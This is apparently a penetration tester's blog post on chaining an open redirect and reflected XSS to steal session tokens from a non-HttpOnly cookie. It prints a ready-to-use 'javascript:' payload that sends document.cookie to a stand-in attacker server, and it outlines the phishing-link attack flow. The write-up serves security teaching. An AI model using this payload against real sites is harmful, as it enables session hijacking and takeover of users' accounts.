---
layout: post
title: One-Click Account Takeover - From XSS to Session Token Exfiltration
description: "Demonstrating how to chain an XSS to exfiltrate tokens in a web application."
category: blog
---

On a recent pentest I was able to chain an Open Redirect + XSS to exfiltrate session tokens, only needing for a user to click on a link.

### Open Redirect on redirectUrl

While browsing the site, I noticed that the application used a `redirectUrl` parameter to redirect the application to different functionalities. The parameter was present in multiple endpoints.

Naturally, one would test for open redirections or SSRFs payloads, and that’s exactly what I did: the application was vulnerable.

The application then used the query.returnUrl to redirect to the site of my choosing.

So far, nothing too complicated, just a standard open redirect vulnerability.

### Open Redirect + Reflected XSS

My instict told me that there is something more, I was almost certain that JS would be executed, but I had to stop testing for the day, for a personal issue.

A day later, a colleague told me that he found that it was also possible to execute JS by executing inline javascript (`javascript:`) so I was right initially, but didn’t yet proved it.

So now, I also had a traditional Open Redirect + XSS, that occurs when user input is rendered without sanitization.

### Session Hijacking

Since XSS are vulnerabilities that focus on end-users, if you come across an XSS, it’s always a good practice to start looking for ways to weaponize it to show even more impact. Many times on pentests or bounties, once we come across a valid XSS, we rush to report it, when sometimes it’s best to pause and see how it can be used.

I started looking for ways to use this XSS to exfiltrate session tokens. The goal here is to find either a Cookie, API endpoint or browse LocalStorage and see if the token can be called from JavaScript.

LocalStorage wasn’t storing any session tokens, so this was a dead end.
Couldn’t identify any API endpoint that allowed me to reflect the session token, so this was also a dead end for now.
The main session Cookie Onsite_Company_US, has Httponly flag set, so it’s inaccessible from JavaScript.
These are the main functionalities one would start looking for any ways to take advantage of the cross site scripting vulnerability that we already have, but none of them seemed to have the actual conditions to obtain a session token.

However, I noticed that the application used another Cookie Onsite_US, without Httponly flag, that also reflected the token! I see this often: some Cookies or features are well protected, and have security mechanisms in place to avoid abuse, and others don’t, possibly for changes in code that were introduced, or needed in certain cases of features. This is a clear example of how developers need to close all doors and windows from the castle, but as attackers we only need to find a single forgotten window get in.

Now I had the perfect scenario to create a one-click account takeover attack chaining all vulns:

A reflected XSS
A Cookie that contained the session token without Httponly flag set
First, tried using the function fetch() to obtain the cookie, but obtained the error:

```
Invalid href passed to next/router: \\, repeated forward-slashes (//) or backslashes \\ are not valid in the href
```

So I had to find other ways to do it, and after researching for a bit, ended up crafting the following payload:

```
javascript:const%20img=new%20Image(1,1);img.src=%22http://attacker-server.com/?data=%22%2bdocument.cookie;document.body.appendChild(img);\n
```

After sending the request, I was able to exfiltrate the token which allowed me to do anything I wanted with the users’ account.

The final attack, will be like this:

- An attacker sends a link to a user, tricking him into click on it.
- A user clicks without suspecting anything
- If the user is authenticated, the application will exfiltrate the token to a server that the attacker controls.

Ant that’s it: one-click account takeover.
